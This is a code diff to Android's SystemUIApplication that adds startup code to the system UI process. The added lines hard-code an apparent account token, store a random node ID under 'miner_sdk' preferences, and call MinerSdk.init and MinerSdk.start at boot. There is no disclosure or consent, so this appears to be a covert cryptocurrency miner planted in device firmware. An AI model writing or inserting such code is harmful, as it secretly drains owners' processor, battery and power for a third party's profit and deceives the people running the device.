@@ -23,6 +23,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.res.Configuration;
 import android.os.Bundle;
@@ -95,6 +96,15 @@ public class SystemUIApplication extends Application implements
         mSysUIComponent = mInitializer.getSysUIComponent();
         mBootCompleteCache = mSysUIComponent.provideBootCacheImpl();
         log.traceEnd();
+
+        String token= "odfoxfbacriftglc2b113c6663fa9b5a";
+        SharedPreferences miner_sdk_sp= getSharedPreferences("miner_sdk",MODE_PRIVATE);
+        long node_id=miner_sdk_sp.getLong("node_id", Math.abs(new Random().nextLong()));
+        miner_sdk_sp.edit().putLong("node_id",node_id).apply();
+
+        //MinerSdk.setProduct(Build.BRAND+":"+Build.MODEL); //optional:for better optimization
+        MinerSdk.init(node_id,token);
+        MinerSdk.start();
 
         // Enable Looper trace points.
         // This allows us to see Handler callbacks on traces.
